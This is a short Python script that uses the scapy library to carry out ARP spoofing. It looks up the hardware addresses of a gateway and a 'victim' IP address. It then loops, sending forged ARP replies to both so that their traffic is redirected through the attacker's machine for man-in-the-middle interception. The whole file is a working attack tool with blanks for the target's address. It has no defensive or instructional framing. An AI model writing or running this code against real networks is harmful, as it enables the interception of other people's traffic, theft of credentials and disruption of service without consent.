from scapy.all import *
from time import sleep
from scapy.layers.l2 import Ether
from scapy.layers.l2 import ARP

def getMAC(ip):
    ans, unans = srp(Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(pdst = ip), timeout = 5, retry = 3)
    for s, r in ans :
        return r.sprintf('%%Ether.src%')
    
def spoofARP(srcip, targetip, targetmac):
    arp = ARP(op = 2, psrc = srcip, pdst = targetip, hwdst = targetmac)
    send(arp)

def main():
    gatewayip = '' #Enter IP of Gateway Here.
    victimip = '' #Enter IP of Target Here.
    victimmac = getMAC(victimip)
    gatewaymac = getMAC(gatewayip)

    print('Attacked [%s] successfully.' %(gatewaymac))

    try:
        while True:
            spoofARP(gatewayip,victimip,victimmac)
            spoofARP(victimip,gatewayip,gatewaymac)
            sleep(1)
    except KeyboardInterrupt:
        print('End process.')

if __name__ == '__main__':
    main()



    